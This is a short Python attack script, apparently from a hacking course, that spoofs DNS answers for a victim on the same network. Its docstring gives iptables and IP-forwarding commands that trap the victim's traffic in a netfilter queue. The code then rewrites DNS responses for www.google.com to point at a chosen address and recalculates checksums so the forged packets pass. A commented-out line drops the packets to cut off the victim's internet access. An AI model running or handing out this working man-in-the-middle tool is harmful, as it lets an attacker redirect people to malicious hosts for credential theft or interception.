#!/usr/bin/env python
"""
first of all issue this command to trap victim's requests and this library to modify net filter queue
1- 
    1-1 iptables -I FORWARD -j NFQUEUE --queue-num 0
    1-2 after we are done do this to nullify iptables: iptables --flush

2- 
    2-1 pip install netfilterqueue
    2-2 if failed, try this first: apt install libnfnetlink-dev libnetfilter-queue-dev
3- echo 1 > /proc/sys/net/ipv4/ip_forward
============================================
in case when we want to check out on our local computer:
1- iptables -I OUTPUT -j NFQUEUE --queue-num 0
2- iptables -I INPUT -j NFQUEUE --queue-num 0
3- after done, iptables --flush

"""

import netfilterqueue
import scapy.all as scapy

def processPacket(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if b"www.google.com" in qname:
            print("[+] spoofing")
            answere = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
            scapy_packet[scapy.DNS].an = answere
            scapy_packet[scapy.DNS].ancount = 1   #we got this ancount from DNS response packet which specifies how many records are sent back and we need to modify it also to correspond with our one single response
            
            #deleting fields that tell that packet has been modified, scapy will recalculate them for us
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            
            #set payload we created
            packet.set_payload(bytes(scapy_packet))
    #print the raw pyaload
    #print(packet.get_payload())
    
    #packet.drop() #cut the internet of victim
    packet.accept() #it will simply direct packets to their destination

#creating an instance of netfilterque object
queue = netfilterqueue.NetfilterQueue() 

#to bind the queue with the queue that we have created with iptabls
queue.bind(0, processPacket)
queue.run()